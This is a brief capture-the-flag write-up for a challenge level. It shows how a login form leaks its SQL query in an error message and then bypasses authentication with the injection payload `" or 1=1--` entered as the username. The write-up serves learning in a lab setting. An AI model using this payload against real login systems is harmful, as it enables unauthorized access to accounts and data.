#### Level 5

URL: http://vg.no/ctf/level5-regexp/

Smells SQL injection here. Lets try to get some errors. 

We get this error if we Write " in the username input field:

`SQL error while executing query: SELECT * FROM users WHERE username = """ AND password = "eff23d564c0ce4edc44699b9cbcbb002"`

Lets alter the query so it looks like this:
`SQL error while executing query: SELECT * FROM users WHERE username = "" OR 1=1 --" AND password = "b27a009c31be9b9505564fa15206495c"`

1=1 will always be true and the "--" makes everything that comes after it a comment.

Just write `" or 1=1--` in the username input field.
